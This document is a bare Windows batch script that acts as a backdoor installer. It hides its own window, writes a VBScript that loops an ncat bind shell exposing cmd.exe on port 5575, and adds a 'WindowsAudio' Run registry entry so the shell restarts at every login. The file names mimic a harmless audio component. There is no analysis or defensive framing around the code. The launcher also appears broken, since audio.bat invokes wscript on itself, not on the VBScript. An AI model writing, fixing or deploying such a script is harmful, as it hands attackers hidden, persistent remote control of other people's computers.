@echo off
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

echo Do > "%USERPROFILE%\Downloads\audio.vbs"
echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"

echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.bat" >> "%USERPROFILE%\Downloads\audio.bat"
echo exit >> "%USERPROFILE%\Downloads\audio.bat"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\Downloads\audio.bat" /f > nul 2>&1

start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.bat"

exit
